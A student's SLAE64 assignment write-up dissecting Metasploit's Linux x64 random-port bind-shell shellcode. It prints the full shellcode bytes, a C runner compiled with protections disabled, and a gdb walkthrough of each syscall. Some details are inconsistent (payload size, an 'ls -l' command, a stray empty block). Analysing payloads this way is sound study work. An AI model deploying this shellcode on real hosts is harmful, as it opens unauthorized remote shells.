## Assignment #5.1: Shellcode `linux/x64/shell_bind_tcp_random_port` Dissection
---
---
### Introduction
---
The first `msfvenom` shellcode that is going to be dissected in functionality is the `linux/x64/shell_bind_tcp_random_port` payload.

Let's see it's options:
```bash
SLAE64>  msfvenom -p linux/x64/shell_bind_tcp_random_port --list-options
Options for payload/linux/x64/shell_bind_tcp_random_port:
=========================


       Name: Linux Command Shell, Bind TCP Random Port Inline
     Module: payload/linux/x64/shell_bind_tcp_random_port
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 57
       Rank: Normal

Provided by:
    Geyslan G. Bem <geyslan@gmail.com>

Description:
  Listen for a connection in a random port and spawn a command shell. 
  Use nmap to discover the open port: 'nmap -sS target -p-'.
```

The payload is only 78 bytes and it requires the following parameters:
- `LPORT`: The port to listen for the incoming connection
- `RHOST`: The target address

> NOTE: In the captures of `gdb`, comments are especified with the `<==` symbol. This is added when want to comment what's going on in the debugger.

### Creating the Shellcode
---
Will execute the `ls -l` command. Decided to use a command that can receive options to check how the payload handles it. Also added the full path to make the command string a 7 bytes length only. Let's generate the payload:
```c
SLAE64> msfvenom -p linux/x64/shell_bind_tcp_random_port -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 57 bytes
Final size of c file: 264 bytes
unsigned char buf[] = 
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
SLAE64> 
```
The generated payload size, this time did not change in size.

### Run Shellcode. The C Template
---
To run the shellcode, will use of the `shellcode.c` template renamoed to `Payload_02.c`. The shellcode is placed in the `code[]` string:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
Now it can be compiled:
```bash
gcc -fno-stack-protector -z execstack Payload_02.c -o Payload_02
```
When it's run, is listens for incoming connections in a random port. From another terminal using `netstat` check what's the listening port, and with `netcat`, can connect. A shell is spawned:

<img src="https://galminyana.github.io/img/A052_Shellcode_Run.png" width="75%" height="75%">

### `objdump`: First Approach
---
Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the payload shellcode:

```asm
SLAE64> objdump -M intel -D Payload_02
**_REMOVED_**
0000000000004060 <code>:
    4060:	48 31 f6             	xor    rsi,rsi
    4063:	48 f7 e6             	mul    rsi
    4066:	ff c6                	inc    esi
    4068:	6a 02                	push   0x2
    406a:	5f                   	pop    rdi
    406b:	b0 29                	mov    al,0x29
    406d:	0f 05                	syscall 
    406f:	52                   	push   rdx
    4070:	5e                   	pop    rsi
    4071:	50                   	push   rax
    4072:	5f                   	pop    rdi
    4073:	b0 32                	mov    al,0x32
    4075:	0f 05                	syscall 
    4077:	b0 2b                	mov    al,0x2b
    4079:	0f 05                	syscall 
    407b:	57                   	push   rdi
    407c:	5e                   	pop    rsi
    407d:	48 97                	xchg   rdi,rax
    407f:	ff ce                	dec    esi
    4081:	b0 21                	mov    al,0x21
    4083:	0f 05                	syscall 
    4085:	75 f8                	jne    407f <code+0x1f>
    4087:	52                   	push   rdx
    4088:	48 bf 2f 2f 62 69 6e 	movabs rdi,0x68732f6e69622f2f
    408f:	2f 73 68 
    4092:	57                   	push   rdi
    4093:	54                   	push   rsp
    4094:	5f                   	pop    rdi
    4095:	b0 3b                	mov    al,0x3b
    4097:	0f 05                	syscall 
	...
**_REMOVED_**
SLAE64> 
```
Per the disassembled code, a total of 5 syscalls been used. Let's see which ones are for the values of RAX before `syscall` instruction:
- `sys_socket` : Value 0x29
- `sys_listen` : Value 0x32
- `sys_accept` : Value 0x2b
- `sys_dup2`   : Value 0x21
- `sys_execve` : Value 0x3b

### The Fun: GDB Analysis
---
As how the shellcode is disasembled, the code can be divided in sections. This sections are defined by the different syscalls. To simplify the analysis, we going to debug section by section.

Let's load the exec file into `gdb`, setup the environment, and place a breakpoint in the code section with `b *&code`:

```asm
SLAE64> gdb ./Payload_02
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Reading symbols from ./Payload_02...(no debugging symbols found)...done.
(gdb) 
(gdb) set disassembly-flavor intel
(gdb) b *&code
Breakpoint 1 at 0x4060
(gdb) 
```
Now can start debugging, let's `run` the program and `disassemble` it:
```asm
(gdb) run
Starting program: /root/SLAE64/Exam/Assignment05/Payload_02 
ShellCode Lenght: 57

Breakpoint 1, 0x0000555555558060 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0000555555558060 <+0>:	xor    rsi,rsi
   0x0000555555558063 <+3>:	mul    rsi
   0x0000555555558066 <+6>:	inc    esi
   0x0000555555558068 <+8>:	push   0x2
   0x000055555555806a <+10>:	pop    rdi
   0x000055555555806b <+11>:	mov    al,0x29
   0x000055555555806d <+13>:	syscall 
   0x000055555555806f <+15>:	push   rdx
   0x0000555555558070 <+16>:	pop    rsi
   0x0000555555558071 <+17>:	push   rax
   0x0000555555558072 <+18>:	pop    rdi
   0x0000555555558073 <+19>:	mov    al,0x32
   0x0000555555558075 <+21>:	syscall 
   0x0000555555558077 <+23>:	mov    al,0x2b
   0x0000555555558079 <+25>:	syscall 
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi
   0x000055555555807d <+29>:	xchg   rdi,rax
   0x000055555555807f <+31>:	dec    esi
   0x0000555555558081 <+33>:	mov    al,0x21
   0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
   0x0000555555558087 <+39>:	push   rdx
   0x0000555555558088 <+40>:	movabs rdi,0x68732f6e69622f2f
   0x0000555555558092 <+50>:	push   rdi
   0x0000555555558093 <+51>:	push   rsp
   0x0000555555558094 <+52>:	pop    rdi
   0x0000555555558095 <+53>:	mov    al,0x3b
   0x0000555555558097 <+55>:	syscall 
   0x0000555555558099 <+57>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) 
```
All looks good, let's dissect the functionality.

#### Section 1: `sys_socket`

In this section, the `execve` call is to be used. From it's man page can get the function definition:
```c
int socket(int domain, int type, int protocol);
```
Then registers for this syscall need to get the following values:
- RAX gets the syscall number, 0x29
- RDI gets the domain. As it's an IPv4 connection, value has to be 2 (AF_INET)
- RSI gets the type of the connection. As it's a TCP oriented connection, value has to be 0x01 (SOCK_STREAM)
- RDX gets the protocol. As it's an IP connection, value has to be 0x00
Let's debug this part, reviewing that registers get this values before the syscall, and understanding what's done in the code:
```asm
(gdb) stepi
0x0000555555558063 in code ()
(gdb) stepi
0x0000555555558066 in code ()
(gdb) stepi
0x0000555555558068 in code ()
(gdb) stepi
0x000055555555806a in code ()
(gdb) stepi
0x000055555555806b in code ()
(gdb) stepi
0x000055555555806d in code ()
(gdb) disassemble 
Dump of assembler code for function code:
   0x0000555555558060 <+0>:	xor    rsi,rsi        <== ZEROes RSI
   0x0000555555558063 <+3>:	mul    rsi            <== RAX <- 0 and RDX <- 0
   0x0000555555558066 <+6>:	inc    esi            <== RSI <- 1 for SOCK_STREAM
   0x0000555555558068 <+8>:	push   0x2            <== RDI <- 2 for AF_INET
   0x000055555555806a <+10>:	pop    rdi
   0x000055555555806b <+11>:	mov    al,0x29        <== RAX <- 0x29 for syscall number
=> 0x000055555555806d <+13>:	syscall 
**_REMOVED_**
End of assembler dump.
(gdb) 
```
At this point, let's review that registers got the right values:
```asm
(gdb) info registers rax rdi rsi rdx
rax            0x29                41
rdi            0x2                 2
rsi            0x1                 1
rdx            0x0                 0
(gdb) 
```
Then the syscall can be run, as the parameters are correct. Remember that this syscall returns in RAX the socket descriptor.
```asm
(gdb) stepi
0x000055555555806f in code ()
```
#### Section 2: `sys_listen`
Here in this section the `listen` call. From the man page:
```c
int listen(int sockfd, int backlog);
```
Values for registers for this call have to be:
- RAX gets the syscall number, 0x32
- RDI gets the sock_descriptor
- RSI gets the backlog, 0x00
Let's understand the code here:
```asm
(gdb) stepi
0x0000555555558070 in code ()
(gdb) stepi
0x0000555555558071 in code ()
(gdb) stepi
0x0000555555558072 in code ()
(gdb) stepi
0x0000555555558073 in code ()
(gdb) stepi
0x0000555555558075 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**   
   0x000055555555806f <+15>:	push   rdx         <== Stack <- 0x00. RDX been zero'ed at +3
   0x0000555555558070 <+16>:	pop    rsi         <== RSI <- 0 for the parameter
   0x0000555555558071 <+17>:	push   rax         <== Pushes the socket descriptor in the stack
   0x0000555555558072 <+18>:	pop    rdi         <== RDI <- socket descriptor. Pop'ed from stack
   0x0000555555558073 <+19>:	mov    al,0x32     <== RAX <- Syscall number
=> 0x0000555555558075 <+21>:	syscall 
**_REMOVED_**
End of assembler dump.
(gdb) 
```
Everyting looks correct. Let's check if the registers have the right values before the syscall:
```asm
(gdb) info registers rax rdi rsi
rax            0x32                50
rdi            0x3                 3
rsi            0x0                 0
(gdb) 
```
Good. s expected.
#### Section 3: `sys_accept`
For the`accept` call, it's defined as:
```c
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```
Registers need this values:
- RAX for the syscall number, 0x2b
- RDI for the socket descriptor, that's already in RDI from the previous section (value "3")
- RSI a pointer to the sockaddr
- RDX the length of this struct
As i don't understand why no values are assigned to RSI and RDX in the code, a further read of the `accept()` man page, clarifies everything:
```c
...
When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
...
```
This mean that this two registers can be set to 0x00. Let's understand what the code does:
```asm
(gdb) stepi
0x0000555555558077 in code ()
(gdb) stepi
0x0000555555558079 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x0000555555558077 <+23>:	mov    al,0x2b     <== Syscall number for accept()
=> 0x0000555555558079 <+25>:	syscall 
**_REMOVED_**
End of assembler dump.
(gdb) 
```
RSI and RDX already got the NULL (`0x00`) value at instructions at +16 and + 18. Let's review the values of the registers before the syscall:
```asm
(gdb) info registers rax rdi rsi rdx
rax            0x2b                43
rdi            0x3                 3
rsi            0x0                 0
rdx            0x0                 0
(gdb) 
```
Good, the expected values. The syscall can be executed, and will return a socket descriptor in RAX. 

#### Section 4: `sys_dup2`
From the `dup2()` manpage:
```c
int dup2(int oldfd, int newfd);
```
This said, register values for this call have to be:
- RAX for the syscall number, 0x21
- RDI for the old socket descriptor. Has to be the value returned in RAX for the previous `accept` syscall
- RSI for new file descriptor to duplicate the old descriptor. Will be the file descriptor for `stdin`, `stdout`, and `stderr`. 

> Ass the `accept()` will pause the program until a connection is received, a `netcat` connection is done from another terminal. Still while debugging, the program wont work as expected because no `dup2()`and no `execve()` been done yet. 

Reviewing the code:
```asm
(gdb) stepi
0x000055555555807b in code ()
(gdb) stepi
0x000055555555807c in code ()
(gdb) stepi
0x000055555555807d in code ()
(gdb) stepi
0x000055555555807f in code ()
(gdb) stepi
0x0000555555558081 in code ()
(gdb) stepi
0x0000555555558083 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555807b <+27>:	push   rdi         <== RDI has the socket descriptor from `socket` call (that's "3")
   0x000055555555807c <+28>:	pop    rsi         <== RSI <- Socket descriptor
   0x000055555555807d <+29>:	xchg   rdi,rax     <== RDI <- Socket descriptor for the `accept`. This is the 
   0x000055555555807f <+31>:	dec    esi         <== RDI = RDI - 1
   0x0000555555558081 <+33>:	mov    al,0x21     <== Syscall Number for `dup2`
=> 0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>   <== Jumps to +31 to `dup2()` another new file descriptor
**_REMOVED_**
End of assembler dump.
(gdb) 
```
The code simply places the old file descriptor into RDI, and the new one into RSI. The `jne` at +37 jumps back to +31, that decrements the value for RSI to duplicate another new file descriptor. New file descriptors will be duplicated in this order: `stderr`("2"), `stdout`("1") and then `stdin`("0"). When RSI value is "0", then the jump is not done and the program continues the flow.
To check that register valuesare correct before the syscall, let's place a breakpoinit at the +35 just before executing the syscall to be able to review it the 3 times it's called. Also at +39 `push rdx` after the duplication code to stop once it's done:
```asm
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi
   0x000055555555807d <+29>:	xchg   rdi,rax
   0x000055555555807f <+31>:	dec    esi
   0x0000555555558081 <+33>:	mov    al,0x21
=> 0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
   0x0000555555558087 <+39>:	push   rdx
**_REMOVED_**
End of assembler dump.
(gdb) info registers rdi rsi rax
rdi            0x4                 4
rsi            0x2                 2
rax            0x21                33
(gdb) b *0x0000555555558083
Breakpoint 2 at 0x555555558083
(gdb) b *0x0000555555558087
Breakpoint 3 at 0x555555558087
(gdb) 
```
In the first loop to duplicate `stderr`, RAX has to be 0x21, RDI has to be "0x04", and RSI has to be "0x02". Let's check:
```asm
(gdb) info registers rax rdi rsi
rax            0x21                33
rdi            0x4                 4
rsi            0x2                 2
(gdb) 
```
Let's `continue` execution. It will do the jump, do the operations, and again before executing the syscall. This is loop 2 to duplicate `stdout`, hence values for registers must be "0x21" for RAX, "0x04" for RDI and "0x01" for RSI:
```asm
(gdb) c
Continuing.
Breakpoint 2, 0x0000555555558083 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi
   0x000055555555807d <+29>:	xchg   rdi,rax
   0x000055555555807f <+31>:	dec    esi
   0x0000555555558081 <+33>:	mov    al,0x21
=> 0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
**_REMOVED_**
End of assembler dump.
(gdb) info registers rax rdi rsi
rax            0x21                33
rdi            0x4                 4
rsi            0x1                 2
(gdb) 
```
If `continue` again, will jump to +31 again for the duplication of `stdin`. Here the values have to be RAX to "0x21", RDI keeps the "0x04" value, and RSI updates to "0x00". 
```asm
(gdb) c
Continuing.
Breakpoint 2, 0x0000555555558083 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi
   0x000055555555807d <+29>:	xchg   rdi,rax
   0x000055555555807f <+31>:	dec    esi
   0x0000555555558081 <+33>:	mov    al,0x21
=> 0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
**_REMOVED_**
End of assembler dump.
(gdb) info registers rax rdi rsi
rax            0x21                33
rdi            0x4                 4
rsi            0x0                 0
(gdb) 
```
Awesome. Everything as it should. Now let's `continue` the program, and this time won't jump and will stop at +39, ending the `dup2` section:
```asm
(gdb) c
Continuing.
Breakpoint 3, 0x0000555555558087 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
=> 0x0000555555558087 <+39>:	push   rdx
**_REMOVED_**
End of assembler dump.
(gdb) 
```
#### Section 5: `sys_execve`

From the `execve` manpage:
```c
int  execve  (const  char  *filename,  
              const  char *argv [], const char
              *envp[]);
```
Also reviewing the code for this section in `gdb`, there is an hex value (`0x68732f6e69622f2f`) at +40 that ends being pushed in the stack at +50. Let's see what this value is:
```python
>>> "68732f6e69622f2f".decode('hex')[::-1]
'//bin/sh'
>>> 
```` 
This means that `execve` will execute the hardcoded command `//bin/sh`. And this defines values for the registers as follows:
- RAX: Syscall number, "0x3b"
- RDI: The memory address for the `//bin/sh` string
- RSI: The pointer to the memory address containing the address of the parameters. As no parameters are needed or used, simply gets the NULL value "0x00"
- RDX: NULL value, "0x00"
The Stack Technique is used, hence will need to review the values pushed in the stack. `stepi`'ing and following the code, the stack contents just before the syscall should be:
```asm






















### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment05) for this assignment contains the following files:

- [Payload_01.c](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Payload_01.c) : The C file cloned from `shellcode.c` to execute the `linux/x64/exec` shellcode.
- [Shellcode_01.txt](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Shellcode_01.txt) : The rax shellcode in hex into a text file.

### The End
---
This pages have been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html).

Student ID: PA-14628
 
